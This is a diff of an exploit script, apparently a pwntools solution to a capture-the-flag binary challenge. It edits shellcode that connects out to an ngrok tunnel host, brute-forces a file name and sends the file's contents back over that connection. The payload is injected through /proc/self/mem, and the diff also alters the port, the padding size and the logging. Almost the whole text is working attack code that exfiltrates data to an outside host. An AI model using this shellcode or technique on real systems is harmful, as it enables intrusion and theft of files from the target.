@@ -37,7 +37,7 @@ buf2 = 0x400
 
 #reverse connect and brute force file name
 
-shellcode = shellcraft.connect('8.tcp.ngrok.io', 17942)
+shellcode = shellcraft.connect('8.tcp.ngrok.io', 13240)
 shellcode += '''
     /* brute force file name */
 
@@ -73,8 +73,8 @@ shellcode += '''
 shellcode += shellcraft.sendfile('rbp', 'rax', 0x0, 0x100)
 shellcode += shellcraft.exit(0)
 
-log.info('Shellcode:\n' + shellcode)
-log.info('Shellcode len: ' + hex(len(shellcode)))
+#log.info('Shellcode:\n' + shellcode)
+log.info('Shellcode len: ' + hex(len(asm(shellcode))))
 
 #exploit
 
@@ -92,7 +92,7 @@ s = s.ljust(buf1, b'\x00')
 s += b'/proc/self/mem'
 s = s.ljust(buf2, b'\x00')
 s += asm(shellcode)
-s = s.ljust(0xe0e, b'\x00')
+s = s.ljust(0x50e, b'\x00')
 
 p.sendlineafter('again.', s)
 
